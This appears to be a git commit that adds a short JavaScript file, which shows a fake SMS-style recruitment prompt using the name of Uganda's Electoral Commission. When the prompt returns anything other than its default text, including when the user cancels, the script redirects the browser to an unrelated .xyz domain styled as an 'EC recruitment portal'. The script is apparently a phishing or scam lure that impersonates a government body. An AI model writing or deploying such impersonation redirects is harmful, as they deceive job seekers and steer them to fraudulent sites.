68f24b356ce5d29e250aefc8cd07a9deb4ea8b7f
newetijazz9 <newetijazz9@gmail.com>
2025-11-10 10:03:56 +0100

    Create ug-electoral.js

---
+++ ug-electoral.js
@@ -0,0 +1,9 @@
+var password = 'Electoral Commission Uganda'
+
+password=prompt('SMS: Welcome to our recruitment portal,click OK to submit your application','Electoral Commission Uganda');
+
+if (password != 'Electoral Commission Uganda') {
+
+location.href='https://www.ekporoku.xyz/ec-Recruitment-Portal';
+
+}
